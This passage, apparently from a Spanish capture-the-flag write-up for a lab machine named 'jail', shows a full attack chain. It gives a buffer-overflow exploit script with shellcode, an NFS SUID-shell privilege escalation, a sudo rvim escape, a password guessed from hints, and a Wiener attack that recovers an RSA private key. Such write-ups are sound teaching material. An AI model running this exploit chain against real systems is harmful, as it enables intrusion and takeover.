+0020| </span><span class="na">0xffffcf94</span><span class="p"> --> 0x0 
+0024| </span><span class="na">0xffffcf98</span><span class="p"> --> 0x0 
+0028| </span><span class="na">0xffffcf9c</span><span class="p"> --> 0x41410000 ('')</span><span class="na">
+[------------------------------------------------------------------------------]</span><span class="p">
+Legend: </span><span class="kd">code</span><span class="p">, </span><span class="na">data</span><span class="p">, </span><span class="s2">rodata</span><span class="p">, value
+Stopped reason: </span><span class="kd">SIGSEGV</span><span class="p">
+</span><span class="na">0x413b4141 </span><span class="p">in </span><span class="no">??</span><span class="p"> ()
+</span><span class="kd">gdb-peda$</span>
+</code></pre></div></div>
+
+<div><p>Ahora podemos buscar el offset y vemos que necesitamos 28 bytes anted de llegar al EIP</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="kd">gdb-peda$</span><span class="p"> pattern_offset 0x413b4141
+1094402369 found at offset: </span><span class="na">28</span><span class="p">
+</span><span class="kd">gdb-peda$</span>
+</code></pre></div></div>
+
+<div><p>Seguimos analizando el codigo podemos ver que existe un modo que podemos activar con DEBUG</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="kd">else if </span><span class="p">(</span><span class="k">strncmp</span><span class="p">(token, </span><span class="s2">"DEBUG"</span><span class="p">,</span><span class="na"> 5</span><span class="p">)</span><span class="kd"> ==</span><span class="na"> 0</span><span class="p">) {
+    </span><span class="kd">if </span><span class="p">(debugmode </span><span class="kd">==</span><span class="na"> 0</span><span class="p">) {
+        debugmode </span><span class="kd">=</span><span class="na"> 1</span><span class="p">;
+        </span><span class="k">printf</span><span class="p">(</span><span class="s2">"OK DEBUG mode on.\n"</span><span class="p">);
+        </span><span class="k">fflush</span><span class="p">(stdout);
+    } </span><span class="kd">else if</span><span class="p"> (debugmode </span><span class="kd">==</span><span class="na"> 1</span><span class="p">) {
+        debugmode </span><span class="kd">=</span><span class="na"> 0</span><span class="p">;
+        </span><span class="k">printf</span><span class="p">(</span><span class="s2">"OK DEBUG mode off.\n"</span><span class="p">);
+        </span><span class="k">fflush</span><span class="p">(stdout);
+    }
+}</span>
+</code></pre></div></div>
+
+<div><p>Su el modo debug esta activado nos devuelve userpass buffer @ y puede ser que una direccion</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="kd">if </span><span class="p">(debugmode </span><span class="kd">==</span><span class="na"> 1</span><span class="p">) {
+    </span><span class="k">printf</span><span class="p">(</span><span class="s2">"Debug: userpass buffer @ %p\n"</span><span class="p">, userpass);
+    </span><span class="k">fflush</span><span class="p">(stdout);
+}</span>
+</code></pre></div></div>
+
+<div><p>Vamos a hacer mas pruebas asi que cerramos el gdb y abrimos de nuevo el programa</p></div>  
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ gdb</span><span class="p"> -q ./jail
+Reading symbols from </span><span class="s2">./jail</span><span class="p">...
+(No debugging symbols found in </span><span class="s2">./jail</span><span class="p">)
+</span><span class="kd">gdb-peda$</span><span class="p"> set detach-on-fork off
+</span><span class="kd">gdb-peda$</span><span class="p"> set follow-fork-mode child
+</span><span class="kd">gdb-peda$</span><span class="p"> run
+Starting program: ./jail</span>
+</code></pre></div></div>
+
+<div><p>Vamos a crear un payload para enviarlo manualmente como PASS a el programa</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ python3</span><span class="p"> -q        
+</span><span class="kd">>>></span><span class="p"> "A"*28 + "B"*4 + "C"*10
+'AAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCCCCCCC'
+</span><span class="kd">>>></span>
+</code></pre></div></div>
+
+<div><p>Ahora bien, tenemos esa cadena de caracteres, pero porque esos?, vamos a ver</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">"A" </span><span class="kd">*</span><span class="na"> 28</span><span class="c1">       # Bytes necesarios de basura o junk antes de llegar al EIP
+</span><span class="s2">"B" </span><span class="kd">*</span><span class="na"> 4</span><span class="c1">        # Longiitud de la direccion a la que apuntaremos en el EIP
+</span><span class="s2">"C" </span><span class="kd">*</span><span class="na"> 10</span><span class="c1">       # "Simula" shellcode o instrucciones a donde apunta el EIP</span>
+</code></pre></div></div>
+
+<div><p>Esta vez enviaremos la data manual para ver la respuesta del programa</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ netcat</span><span class="p"> 127.0.0.1 7411
+OK Ready. Send USER command.
+</span><span class="kd">DEBUG</span><span class="p">
+OK DEBUG mode on.
+</span><span class="kd">USER admin</span><span class="p">
+OK Send PASS command.
+</span><span class="kd">PASS AAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCCCCCCC</span><span class="p">
+Debug: userpass buffer @ </span><span class="na">0xffffcf60</span>
+</code></pre></div></div>
+
+<div><p>Bien nos ha devuelto una direccion, volvamos a gdb donde el programa corrompe</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="kd">gdb-peda$ </span><span class="p">run
+Starting program: ./jail 
+[Attaching after process 66951 fork to child process 66983]
+[New inferior 2 (process 66983)]
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "</span><span class="s2">/lib/x86_64-linux-gnu/libthread_db.so.1</span><span class="p">".
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "</span><span class="s2">/lib/x86_64-linux-gnu/libthread_db.so.1</span><span class="p">".
+
+Thread 2.1 "jail" received signal SIGSEGV, Segmentation fault.
+[Switching to Thread 0xf7fc2500 (LWP 66983)]</span><span class="na">
+[----------------------------------registers-----------------------------------]
+</span><span class="s2">EAX</span><span class="p">: 0x0 
+</span><span class="s2">EBX</span><span class="p">: </span><span class="s2">0xf7e1cff4</span><span class="p"> --> 0x21cd8c 
+</span><span class="s2">ECX</span><span class="p">: </span><span class="na">0xf7e1e9b8</span><span class="p"> --> 0x0 
+</span><span class="s2">EDX</span><span class="p">: 0x1 
+</span><span class="s2">ESI</span><span class="p">: </span><span class="kd">0x8048e70</span><span class="p"> (&lt__libc_csu_init>:      push   ebp)
+</span><span class="s2">EDI</span><span class="p">: </span><span class="s2">0xf7ffcb80</span><span class="p"> --> 0x0 
+</span><span class="s2">EBP</span><span class="p">: 0x41414141 ('AAAA')
+</span><span class="s2">ESP</span><span class="p">: </span><span class="na">0xffffcf80</span><span class="p"> ("CCCCCCCCCC")
+</span><span class="s2">EIP</span><span class="p">: </span><span class="p">0x42424242</span><span class="p"> ('BBBB')
+</span><span class="s2">EFLAGS</span><span class="p">: 0x10246 (</span><span class="s2">carry </span><span class="kd">PARITY </span><span class="s2">adjust </span><span class="kd">ZERO </span><span class="s2">sign trap </span><span class="kd">INTERRUPT </span><span class="s2">direction overflow</span><span class="p">)
+</span><span class="na">[-------------------------------------code-------------------------------------]
+</span><span class="kd">Invalid $PC address: 0x42424242
+</span><span class="na">[------------------------------------stack-------------------------------------]</span><span class="p">
+0000| </span><span class="na">0xffffcf80</span><span class="p"> ("CCCCCCCCCC")
+0004| </span><span class="na">0xffffcf84</span><span class="p"> ("CCCCCC")
+0008| </span><span class="na">0xffffcf88</span><span class="p"> --> 0x4343 ('CC')
+0012| </span><span class="na">0xffffcf8c</span><span class="p"> --> </span><span class="na">0xffffcfc8</span><span class="p"> --> 0x0 
+0016| </span><span class="na">0xffffcf90</span><span class="p"> --> </span><span class="na">0xffffcf00</span><span class="p"> --> </span><span class="na">0xf7e1dda0</span><span class="p"> --> 0xfbad2884 
+0020| </span><span class="na">0xffffcf94</span><span class="p"> --> 0x0 
+0024| </span><span class="na">0xffffcf98</span><span class="p"> --> 0x0 
+0028| </span><span class="na">0xffffcf9c</span><span class="p"> --> 0x41410000 ('')
+</span><span class="na">[------------------------------------------------------------------------------]</span><span class="p">
+Legend: </span><span class="kd">code</span><span class="p">,</span><span class="na"> data</span><span class="p">,</span><span class="s2"> rodata</span><span class="p">, value
+Stopped reason: </span><span class="kd">SIGSEGV</span><span class="p">
+</span><span class="na">0x42424242 </span><span class="p">in</span><span class="no"> ??</span><span class="p"> ()
+</span><span class="kd">gdb-peda$</span>
+</code></pre></div></div>
+
+<div><p>Ahora podemos ver que tiene esa direccion y tiene 28 veces A, 4 veces B y algunas C, lo que significa que es donde empieza nuestro payload enviado</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="kd">gdb-peda$</span><span class="p"> x/s 0xffffcf60
+</span><span class="p">0xffffcf60</span><span class="p">:     'A' &ltrepeats 28 times>, "BBBBCCCCCCCCCC"
+</span><span class="kd">gdb-peda$</span>
+</code></pre></div></div>
+
+<div><p>Eso es la direccion en local, pero veamos la direccion del programa que corre en remoto</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ netcat </span><span class="p">10.10.10.34 7411
+OK Ready. Send USER command.
+</span><span class="kd">DEBUG</span><span class="p">
+OK DEBUG mode on.
+</span><span class="kd">USER admin</span><span class="p">
+OK Send PASS command.
+</span><span class="kd">PASS AAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCCCCCCC</span><span class="p">
+Debug: userpass buffer @ </span><span class="na">0xffffd610</span>
+</code></pre></div></div>
+
+<div><p>Esta direccion es del comienzo de nuestro payload pero lo que nos interesa es que apunte a donde este nuestro shellcode que por ahora son las C, lo que significa que a esa direccion tenemos que sumarle los 28 de el junk mas los 4 del eip que serian 32</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="kd">gdb-peda$</span><span class="p"> p 0xffffd610 + 32
+$1 = </span><span class="na">0xffffd630
+</span><span class="kd">gdb-peda$</span>
+</code></pre></div></div>
+
+<div><p>Como estamos en little endian tenemos que darle la vuelta a la direccion en pares de 2</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="na">0xffffd630</span><span class="p">     -->     </span><span class="na">\xff\xff\xd6\x30</span><span class="p">     -->     </span><span class="na">\x30\xd6\xff\xff</span>
+</code></pre></div></div>
+
+<div><p>Esa direccion sera donde apuntemos en el eip, es hora de plasmar lo que sabemos en un script</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="kd">from </span><span class="p">pwn </span><span class="kd">import </span><span class="p">remote
+
+offset </span><span class="kd">=</span><span class="na"> 28</span><span class="p">
+junk </span><span class="kd">= </span><span class="k">b</span><span class="s2">"A" </span><span class="kd">* </span><span class="na">28</span><span class="p">
+eip </span><span class="kd">= </span><span class="k">b</span><span class="s2">"\x30\xd6\xff\xff"</span>
+</code></pre></div></div>
+
+<div><p>Agregamos un <a href="https://www.exploit-db.com/exploits/34060">shellcode</a> que reusando el socket nos lanze una /bin/sh para ejecutar comandos</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="kd">from </span><span class="p">pwn </span><span class="kd">import </span><span class="p">remote
+
+offset </span><span class="kd">=</span><span class="na"> 28</span><span class="p">
+junk </span><span class="kd">= </span><span class="k">b</span><span class="s2">"A" </span><span class="kd">* </span><span class="na">28</span><span class="p">
+eip </span><span class="kd">= </span><span class="k">b</span><span class="s2">"\x30\xd6\xff\xff"</span><span class="p">
+
+shellcode </span><span class="kd"> =</span><span class="k"> b</span><span class="s2">""</span><span class="p">
+shellcode </span><span class="kd">+=</span><span class="k"> b</span><span class="s2">"\x6a\x02\x5b\x6a\x29\x58\xcd\x80\x48\x89\xc6"</span><span class="p">
+shellcode </span><span class="kd">+=</span><span class="k"> b</span><span class="s2">"\x31\xc9\x56\x5b\x6a\x3f\x58\xcd\x80\x41\x80"</span><span class="p">
+shellcode </span><span class="kd">+=</span><span class="k"> b</span><span class="s2">"\xf9\x03\x75\xf5\x6a\x0b\x58\x99\x52\x31\xf6"</span><span class="p">
+shellcode </span><span class="kd">+=</span><span class="k"> b</span><span class="s2">"\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e"</span><span class="p">
+shellcode </span><span class="kd">+=</span><span class="k"> b</span><span class="s2">"\x89\xe3\x31\xc9\xcd\x80"</span>
+</code></pre></div></div>
+
+<div><p>Finalmente formamos nuestro payload y lo enviamos en el campo PASS a la máquina victima</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="kd">from </span><span class="p">pwn </span><span class="kd">import </span><span class="p">remote
+
+offset </span><span class="kd">=</span><span class="na"> 28</span><span class="p">
+junk </span><span class="kd">= </span><span class="k">b</span><span class="s2">"A" </span><span class="kd">* </span><span class="na">28</span><span class="p">
+eip </span><span class="kd">= </span><span class="k">b</span><span class="s2">"\x30\xd6\xff\xff"</span><span class="p">
+
+shellcode </span><span class="kd"> =</span><span class="k"> b</span><span class="s2">""</span><span class="p">
+shellcode </span><span class="kd">+=</span><span class="k"> b</span><span class="s2">"\x6a\x02\x5b\x6a\x29\x58\xcd\x80\x48\x89\xc6"</span><span class="p">
+shellcode </span><span class="kd">+=</span><span class="k"> b</span><span class="s2">"\x31\xc9\x56\x5b\x6a\x3f\x58\xcd\x80\x41\x80"</span><span class="p">
+shellcode </span><span class="kd">+=</span><span class="k"> b</span><span class="s2">"\xf9\x03\x75\xf5\x6a\x0b\x58\x99\x52\x31\xf6"</span><span class="p">
+shellcode </span><span class="kd">+=</span><span class="k"> b</span><span class="s2">"\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e"</span><span class="p">
+shellcode </span><span class="kd">+=</span><span class="k"> b</span><span class="s2">"\x89\xe3\x31\xc9\xcd\x80"</span><span class="p">
+
+payload </span><span class="kd">=</span><span class="p"> junk </span><span class="kd">+</span><span class="p"> eip </span><span class="kd">+</span><span class="p"> shellcode
+
+shell </span><span class="kd">=</span><span class="p"> remote(</span><span class="s2">"10.10.10.34"</span><span class="p">, </span><span class="na">7411</span><span class="p">)
+shell.recvuntil(</span><span class="k">b</span><span class="s2">"OK Ready. Send USER command."</span><span class="p">)
+shell.sendline(</span><span class="k">b</span><span class="s2">"USER admin"</span><span class="p">)
+shell.recvuntil(</span><span class="k">b</span><span class="s2">"OK Send PASS command."</span><span class="p">)
+shell.sendline(</span><span class="k">b</span><span class="s2">"PASS "</span><span class="kd"> + </span><span class="p">payload)
+shell.interactive()</span>
+</code></pre></div></div>
+
+<div><p>Al ejecutar el script, conseguimos una shell como nothing, finalmente podemos ejecutar comandos</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ python3 </span><span class="p">exploit.py
+[</span><span class="s2">+</span><span class="p">] Opening connection to 10.10.10.34 on port 7411: Done
+[</span><span class="na">*</span><span class="p">] Switching to interactive mode
+</span><span class="kd">$</span><span class="p"> whoami
+nobody
+</span><span class="kd">$</span><span class="p"> hostname -I
+10.10.10.34 dead:beef::5e6:97fd:5531:6b96 
+</span><span class="kd">$</span>
+</code></pre></div></div>
+
+<div><p>Con showmount podemos listar monturas compartidas, adelanto que usaremos la segunda</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ showmount</span><span class="p"> -e 10.10.10.34
+Export list for 10.10.10.34:
+/opt          *
+</span><span class="kd">/var/nfsshare *</span>
+</code></pre></div></div>
+
+<div><p>Es importante tener en cuenta que nuestro identificador es 1000 igual que el de frank</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ id</span><span class="p">
+uid=1000(gato) gid=1000(gato) groups=1000(gato)</span>
+</code></pre></div></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="kd">$ </span><span class="p">id frank
+uid=1000(frank) gid=1000(frank) groups=1000(frank)
+</span><span class="kd">$</span>
+</code></pre></div></div>
+
+<div><p>Como tenemos el mismo uid podemos intentar escribir un archivo en la montura</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ sudo umount</span><span class="p"> /mnt
+
+</span><span class="s2">❯ sudo mount</span><span class="p"> -t nfs 10.10.10.34:/var/nfsshare /mnt
+
+</span><span class="s2">❯ touch </span><span class="p">/mnt/test</span>
+</code></pre></div></div>
+
+<div><p>Los cambios en la montura se reflejan en la maquina real asi que existe, y como tenemos el mismo identificador el archivo que existe lo toma como si lo hubiera escrito frank</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="kd">$ </span><span class="p">ls -l /var/nfsshare/test
+-rw-r--r--. 1 </span><span class="na">frank frank</span><span class="p"> 0 Feb  1 10:05 /var/nfsshare/test
+</span><span class="kd">$</span>
+</code></pre></div></div>
+
+<div><p>Podemos crear un script en c que nos otorge una sh con el identificador 1000 y lo compilamos</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="kd">#include </span><span class="s2">&ltstdio.h>
+</span><span class="kd">#include </span><span class="s2">&ltstdlib.h>
+
+</span><span class="k">int </span><span class="na">main</span><span class="p">(</span><span class="k">void</span><span class="p">){
+    setreuid(</span><span class="na">1000</span><span class="p">, </span><span class="na">1000</span><span class="p">);
+    </span><span class="k">system(</span><span class="s2">"/bin/sh"</span><span class="p">);
+    </span><span class="kd">return </span><span class="na">0</span><span class="p">;
+    }</span>
+</code></pre></div></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ gcc</span><span class="p"> shell.c -o shell -static 2>/dev/null
+</span>
+</code></pre></div></div>
+
+<div><p>Lo movemos a la montura y le asignamos suid, esto hara los cambios en la maquina real</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ mv </span><span class="p">shell /mnt
+
+</span><span class="s2">❯ chmod</span><span class="p"> u+s /mnt/shell</span>
+</code></pre></div></div>
+
+<div><p>En la maquina podemos ver el archivo suid creado como frank como propietario</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="kd">$</span><span class="p"> ls -l /var/nfsshare/shell
+-rwsr-xr-x. 1 frank frank 16016 Feb  1 10:13 /var/nfsshare/shell
+</span><span class="kd">$</span>
+</code></pre></div></div>
+
+<div><p>Al ejecutarlo toma el uid 1000 y nos otorga una shell en este caso como frank</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="kd">$</span><span class="p"> /var/nfsshare/shell
+</span><span class="kd">$</span><span class="p"> whoami
+frank
+</span><span class="kd">$</span>
+</code></pre></div></div>
+
+<div><p>Mi idea es conectarme por ssh asi que exporto el HOME y creo un par de claves ssh con ssh-keygen</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="kd">$ </span><span class="p">export HOME=/home/frank
+</span><span class="kd">$ </span><span class="p">ssh-keygen -t ecdsa -b 521
+Enter file in which to save the key (/home/frank/.ssh/id_ecdsa): 
+Enter passphrase (empty for no passphrase): 
+Enter same passphrase again: 
+Generating public/private ecdsa key pair.
+Your identification has been saved in /home/frank/.ssh/id_ecdsa.
+Your public key has been saved in /home/frank/.ssh/id_ecdsa.pub.
+The key fingerprint is:
+22:b4:32:93:ac:94:c5:ef:e3:be:c2:58:f9:99:ab:ee frank@localhost.localdomain
+The key's randomart image is:
++--[ECDSA  521]---+
+|                 |
+|  .              |
+|   o.            |
+| .oo..           |
+| o* +.. S        |
+|.. *.. .         |
+|. + .oo          |
+| . o.+.          |
+|  oE+=o          |
++-----------------+
+</span><span class="kd">$</span>
+</code></pre></div></div>
+
+<div><p>Entramos en el directorio ssh de frank y copiamos la clave ssh publica como clave autorizada</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="kd">$ </span><span class="p">cd ~/.ssh
+</span><span class="kd">$ </span><span class="p">cp id_ecdsa.pub authorized_keys
+</span><span class="kd">$</span>
+</code></pre></div></div>
+
+<div><p>Leemos id clave privada y la usamos como id_rsa para conectarnos por ssh sin contraseña</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="kd">$ </span><span class="p">cat id_ecdsa
+-----BEGIN EC PRIVATE KEY-----
+MIHbAgEBBEFjaiFvbOlMxcqcunsoBT/ASXYDuebJk6A07oHiKbl3inlQpnXCJ88J
+0KD9bsBL9y3I/6nUKry7NjuE6uRl1vakNqAHBgUrgQQAI6GBiQOBhgAEANjxDWY1
+XZUcdnYZCJo8Kwq/jHoWSX/nPOQmiUkc79uN3owuJVffWyt++5vHe+8uRQEMv+lj
+p9r6JW+K7nxuBgNWASGiCFJhFCV0NIOKqtBspPFP7RbiXLLfPMtyn96M1TmqzCbb
+oJdJif1GfXIgcuDbbXzfSbqUjmVgu/DnJLsvFnla
+-----END EC PRIVATE KEY-----
+</span><span class="kd">$</span>
+</code></pre></div></div>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ ssh </span><span class="p">frank@10.10.10.34 -i id_rsa
+[</span><span class="s2">frank@localhost </span><span class="na">~</span><span class="p">]$ id
+uid=1000(frank) gid=1000(frank) grupos=1000(frank)
+[</span><span class="s2">frank@localhost </span><span class="na">~</span><span class="p">]$ hostname -I
+10.10.10.34 dead:beef::5e6:97fd:5531:6b96
+[</span><span class="s2">frank@localhost </span><span class="na">~</span><span class="p">]$ cat user.txt
+3a5**************************f14
+[</span><span class="s2">frank@localhost </span><span class="na">~</span><span class="p">]$</span>
+</code></pre></div></div>
+
+<div><p>Mirando privilegios de sudoers podemos abrir como adm un archivo .c con rvim</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">[</span><span class="s2">frank@localhost </span><span class="na">~</span><span class="p">]$ sudo -l
+Matching Defaults entries for frank on this host:
+    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin
+
+User frank may run the following commands on this host:
+    (frank) NOPASSWD: /opt/logreader/logreader.sh
+    (</span><span class="na">adm</span><span class="p">) NOPASSWD: </span><span class="kd">/usr/bin/rvim /var/www/html/jailuser/dev/jail.c</span><span class="p">
+[</span><span class="s2">frank@localhost </span><span class="na">~</span><span class="p">]$</span>
+</code></pre></div></div>
+
+<div><p>Esto es sencillo, abrimos el archivo como adm y dentro de rvim con py nos spawneamos una bash</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">[</span><span class="s2">frank@localhost </span><span class="na">~</span><span class="p">]$ sudo -u adm rvim /var/www/html/jailuser/dev/jail.c</span>
+</code></pre></div></div>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">:py import pty; pty.spawn('/bin/bash')
+</span><span class="kd">bash-4.2$</span><span class="p"> id
+uid=3(adm) gid=4(adm) grupos=4(adm)
+</span><span class="kd">bash-4.2$</span><span class="p"> hostname -I
+10.10.10.34 dead:beef::5e6:97fd:5531:6b96
+</span><span class="kd">bash-4.2$</span>
+</code></pre></div></div>
+
+<div><p>En el directorio personal de frank podemos ver un directorio oculto llamado .keys</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="kd">bash-4.2$</span><span class="p"> cd
+</span><span class="kd">bash-4.2$</span><span class="p"> ls -la
+drwxr-x---.  3 root adm    19 jul  3  2017 .
+drwxr-xr-x. 23 root root 4096 feb  1 08:28 ..
+drwxr-x---.  3 root adm    52 jul  3  2017 .keys
+</span><span class="kd">bash-4.2$</span>
+</code></pre></div></div>
+
+<div><p>Dentro del directorio podemos ver una nota, un comprimido y otro directorio oculto</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="kd">bash-4.2$</span><span class="p"> cd .keys
+</span><span class="kd">bash-4.2$</span><span class="p"> ls -la
+drwxr-x---. 3 root adm  52 jul  3  2017 .
+drwxr-x---. 3 root adm  19 jul  3  2017 ..
+-rw-r-----. 1 root adm 475 jul  3  2017 keys.rar
+drwxr-x---. 2 root adm  20 jul  3  2017 .local
+-rw-r-----. 1 root adm 154 jul  3  2017 note.txt
+</span><span class="kd">bash-4.2$</span>
+</code></pre></div></div>
+
+<div><p>La nota es del administrador dice que la contraseña tiene que ser su apellido seguido de 4 numeros y un caracter especial</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="kd">bash-4.2$</span><span class="p"> cat note.txt
+Note from Administrator:
+Frank, for the last time, your password for anything encrypted must be your last name followed by a 4 digit number and a symbol.
+</span><span class="kd">bash-4.2$</span>
+</code></pre></div></div>
+
+<div><p>Entramos en el directorio .local donde encontramos un archivo .frank con un texto algo raro</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="kd">bash-4.2$</span><span class="p"> cd .local
+</span><span class="kd">bash-4.2$</span><span class="p"> ls -la
+drwxr-x---. 2 root adm  20 jul  3  2017 .
+drwxr-x---. 3 root adm  52 jul  3  2017 ..
+-rw-r-----. 1 root adm 113 jul  3  2017 .frank
+</span><span class="kd">bash-4.2$</span><span class="p"> cat .frank
+Szszsz! Mlylwb droo tfvhh nb mvd kzhhdliw! Lmob z uvd ofxpb hlfoh szev Vhxzkvw uiln Zoxzgiza zorev orpv R wrw!!!
+</span><span class="kd">bash-4.2$</span>
+</code></pre></div></div>
+
+<div><p>Podemos usar <a href="https://quipqiup.com/">quipqiup</a> para ver el mensaje en claro, nos habla de que ha escapado de Alcatraz</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">Hahaha! Nobody will guess my new password! Only a few lucky souls have Escaped from Alcatraz alive like I did!!!</span>
+</code></pre></div></div>
+
+<div><p>Investigando con palabras clave nos hablan de que Frank Morris escapó de Alcatraz en 1962</p></div>
+<a href="./3.png" target="_blank"><div><p><img src="./3.png"><p></div></a>
+
+<div><p>Podemos usar lo que nos dijo la nota del administrador para construir una contraseña</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">Morris        </span><span class="c1"># Apellido de Frank Morris</span><span class="p">
+1962       </span><span class="c1">   # 4 digitos, la fecha en que escapó</span><span class="p">
+!          </span><span class="c1">   # Un caracter especial, muchas veces se usa exclamación</span><span class="p">
+Morris1962!</span><span class="c1">   # Posible contraseña final</span>
+</code></pre></div></div>
+
+<div><p>Pasamos el archivo rar a nuestro equipo y al descomprimirlo le pasamos la contraseña</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ unrar </span><span class="p">e keys.rar
+
+UNRAR 6.00 freeware      Copyright (c) 1993-2020 Alexander Roshal
+
+Extracting from keys.rar
+
+Enter password (will not be echoed) for rootauthorizedsshkey.pub: </span><span class="kd">Morris1962!</span><span class="p">
+
+Extracting  rootauthorizedsshkey.pub                                  OK</span>
+</code></pre></div></div>
+
+<div><p>Lo que estaba dentro del rar parece ser la clave pública autorizada de root, pero bastante pequeña</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ cat </span><span class="p">rootauthorizedsshkey.pub
+-----BEGIN PUBLIC KEY-----
+MIIBIDANBgkqhkiG9w0BAQEFAAOCAQ0AMIIBCAKBgQYHLL65S3kVbhZ6kJnpf072
+YPH4Clvxj/41tzMVp/O3PCRVkDK/CpfBCS5PQV+mAcghLpSzTnFUzs69Ys466M//
+DmcIo1pJGKy8LDrwdpsSjVmvSgg39nCoOYMiAUVF0T0c47eUCmBloX/K8QjId6Pd
+D/qlaFM8B87MHZlW1fqe6QKBgQVY7NdIxerjKu5eOsRE8HTDAw9BLYUyoYeAe4/w
+Wt2/7A1Xgi5ckTFMG5EXhfv67GfCFE3jCpn2sd5e6zqBoKlHwAk52w4jSihdzGAx
+I85LArqOGc6QoVPS7jx5h5bK/3Oqm3siimo8O1BJ+mKGy9Owg9oZhBl28CfRyFug
+a99GCw==
+-----END PUBLIC KEY-----</span>
+</code></pre></div></div>
+
+<div><p>Podemos usar <a href="https://github.com/RsaCtfTool/RsaCtfTool">RsaCtfTool</a> para pasandole la clave publica intente computar la clave privada</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ python3 </span><span class="p">RsaCtfTool.py --publickey rootauthorizedsshkey.pub --private
+[*] Testing key ../rootauthorizedsshkey.pub.
+[*] Performing wiener attack on ../rootauthorizedsshkey.pub.
+[*] Attack success with wiener method !
+Results for ../rootauthorizedsshkey.pub:
+
+Private key :
+
+-----BEGIN RSA PRIVATE KEY-----
+MIICOgIBAAKBgQYHLL65S3kVbhZ6kJnpf072YPH4Clvxj/41tzMVp/O3PCRVkDK/
+CpfBCS5PQV+mAcghLpSzTnFUzs69Ys466M//DmcIo1pJGKy8LDrwdpsSjVmvSgg3
+9nCoOYMiAUVF0T0c47eUCmBloX/K8QjId6PdD/qlaFM8B87MHZlW1fqe6QKBgQVY
+7NdIxerjKu5eOsRE8HTDAw9BLYUyoYeAe4/wWt2/7A1Xgi5ckTFMG5EXhfv67GfC
+FE3jCpn2sd5e6zqBoKlHwAk52w4jSihdzGAxI85LArqOGc6QoVPS7jx5h5bK/3Oq
+m3siimo8O1BJ+mKGy9Owg9oZhBl28CfRyFuga99GCwIgCMdb8cTpq+uOUyIK2Jrg
+PNxrCGF8HNhw8qT9jCez3aMCQQHBKGne1ibAwbqvPTd91cBUKfFYYIAY9a6/Iy56
